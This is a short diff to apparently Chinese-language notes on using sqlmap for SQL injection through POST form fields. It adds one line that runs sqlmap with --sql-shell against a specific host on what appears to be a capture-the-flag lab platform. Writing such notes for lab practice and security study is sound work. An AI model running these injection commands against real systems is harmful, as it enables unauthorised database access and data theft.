@@ -1145,6 +1145,8 @@ python sqlmap.py -u "注入点" --form --batch  即可自动注入
 
 ```python
 python sqlmap.py -u "注入点" --data "变量名1=值1&变量名2=值2..."    #变量名即表单中输入框的name属性值    多个变量使用&符号分隔
+
+py sqlmap.py -u "http://eci-2ze7wbxsf5wm7j6krxyl.cloudeci1.ichunqiu.com/index.php" --data "username1=admin&password2=asd" --sql-shell
 ```
 
 ### SQLMap  http请求包注入
